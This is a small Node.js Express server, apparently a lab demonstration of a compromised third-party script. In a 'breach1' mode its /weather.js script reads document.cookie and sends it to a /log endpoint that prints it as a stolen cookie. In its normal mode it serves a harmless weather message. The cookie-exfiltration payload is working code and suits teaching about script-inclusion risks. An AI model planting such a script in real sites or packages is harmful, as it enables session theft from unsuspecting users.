const express = require("express");
const path = require("path");
const app = express();

const modeArg = process.argv.find((a) => a.startsWith("--mode="));
const mode = modeArg ? modeArg.split("=")[1] : "normal";

app.get("/log", (req, res) => {
  const data = String(req.query.data || "");
  console.log(`[Attacker] Stolen cookie: ${data || "(empty)"}`);
  res.json({ ok: true });
});

app.get("/weather.js", (req, res) => {
  res.type("application/javascript");

  if (mode === "breach1") {
    res.send(
      [
        "const stolenCookie = document.cookie;",
        'fetch("http://localhost:5000/log?data=" + encodeURIComponent(stolenCookie));',
        'console.log("Cookie successfully sent to Attacker Server!");',
      ].join("\n")
    );
  } else {
    res.send('console.log("Weather: 12°C");');
  }
});

app.use(express.static(path.join(__dirname, "public")));

app.listen(5000, () => {
  console.log("Weather running on http://localhost:5000 (mode=" + mode + ")");
});
